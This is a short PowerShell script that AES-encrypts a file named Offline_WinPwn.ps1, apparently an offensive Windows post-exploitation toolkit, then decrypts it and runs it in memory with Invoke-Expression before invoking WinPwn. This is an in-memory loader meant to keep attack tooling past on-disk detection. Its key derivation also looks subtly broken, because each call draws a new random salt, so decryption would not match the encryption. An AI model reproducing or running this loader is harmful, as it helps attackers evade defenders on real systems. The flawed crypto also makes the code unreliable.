# Set variables
$FileToEncrypt = "C:\Path\To\Offline_WinPwn.ps1"   # File to encrypt
$EncryptedFile = "C:\Path\To\Encrypted.dat"        # Output encrypted file
$Password = "YourStrongPassword"

# Function to encrypt a file
function Encrypt-File {
    param ($InputFile, $OutputFile, $Password)

    # Read file bytes
    $Bytes = [System.IO.File]::ReadAllBytes($InputFile)
    
    # Generate AES key & IV from password
    $AES = [System.Security.Cryptography.AesManaged]::new()
    $AES.Key = (New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, 16)).GetBytes(32)
    $AES.IV = (New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, 16)).GetBytes(16)
    $Encryptor = $AES.CreateEncryptor()

    # Encrypt and write to file
    $Encrypted = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
    [System.IO.File]::WriteAllBytes($OutputFile, $Encrypted)
    
    Write-Host "[+] File encrypted: $OutputFile"
}

# Function to decrypt and execute PS1 in-memory
function Decrypt-RunPS1 {
    param ($EncryptedFile, $Password)

    # Read encrypted file
    $Encrypted = [System.IO.File]::ReadAllBytes($EncryptedFile)

    # Generate AES key & IV from password
    $AES = [System.Security.Cryptography.AesManaged]::new()
    $AES.Key = (New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, 16)).GetBytes(32)
    $AES.IV = (New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, 16)).GetBytes(16)
    $Decryptor = $AES.CreateDecryptor()

    # Decrypt file
    $Decrypted = $Decryptor.TransformFinalBlock($Encrypted, 0, $Encrypted.Length)
    $DecryptedText = [System.Text.Encoding]::UTF8.GetString($Decrypted)

    # Execute script in memory
    Invoke-Expression $DecryptedText
    WinPwn  # Execute WinPwn immediately
}

# Encrypt file
Encrypt-File -InputFile $FileToEncrypt -OutputFile $EncryptedFile -Password $Password

# Decrypt and execute file
Decrypt-RunPS1 -EncryptedFile $EncryptedFile -Password $Password
